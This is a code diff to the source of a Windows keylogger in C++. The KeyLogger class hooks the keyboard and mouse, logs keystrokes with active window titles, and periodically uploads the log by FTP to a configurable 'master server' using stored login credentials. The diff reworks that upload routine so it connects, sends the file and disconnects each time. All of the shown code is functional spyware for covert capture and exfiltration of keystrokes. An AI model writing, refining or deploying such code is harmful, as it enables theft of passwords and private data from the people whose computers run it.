@@ -65,9 +65,6 @@ void KeyLogger::removeSelf() {
 
 void KeyLogger::freeResources() {
     
-    if (useFTP) {
-        ftpClient.disconnect();
-    }
     logFile.close();
     UnhookWindowsHookEx(khook);
     UnhookWindowsHookEx(mhook);
@@ -299,18 +296,10 @@ void KeyLogger::writeBuffer()
     logFile << getTimeString() << endl << activeWindowTitle << endl << "===============================" << endl << keyboardBuffer << endl << "===============================" << endl << endl;
     
     #ifdef USE_FTP
-    if (useFTP) {
-        
-        //upload to master server if it's time
-        if (time(NULL) - lastUpload > UPLOAD_DELTA) {
-            lastUpload = time(NULL);
-            upload();
-        }
-
-        //otherwise just keep the connection open
-        else {
-            ftpClient.keepAlive();
-        }
+    //upload to master server if it's time
+    if (useFTP && time(NULL) - lastUpload > UPLOAD_DELTA) {
+        lastUpload = time(NULL);
+        upload();
     }
     #endif
     
@@ -347,22 +336,29 @@ std::string KeyLogger::getUserHomeDirectory() {
 
 #ifdef USE_FTP
 void KeyLogger::upload() {
-
-    std::string keystrokesFile;
-    keystrokesFile += DATADIR;
-    keystrokesFile += "\\";
-    keystrokesFile += KEYSTROKES_FILE;
-
-    ftpClient.upload(keystrokesFile, uploadDir, sf::Ftp::Ascii);
-}
-
-void KeyLogger::setMaster(std::string server, int port, std::string login, std::string password, std::string _uploadDir) {
     
     ftpClient.connect(server, port);
 
     if (ftpClient.login(login, password).isOk()) {
-        useFTP = true;
-        uploadDir = _uploadDir;
+        std::string keystrokesFile;
+        keystrokesFile += programDir;
+        keystrokesFile += DATADIR;
+        keystrokesFile += "\\";
+        keystrokesFile += KEYSTROKES_FILE;
+
+        ftpClient.upload(keystrokesFile, uploadDir, sf::Ftp::Ascii);
     }
+    
+    ftpClient.disconnect();
+}
+
+void KeyLogger::setMaster(std::string _server, int _port, std::string _login, std::string _password, std::string _uploadDir) {
+    
+    useFTP = true;
+    server = _server;
+    port = _port;
+    login = _login;
+    password = _password;
+    uploadDir = _uploadDir;
 }
 #endif
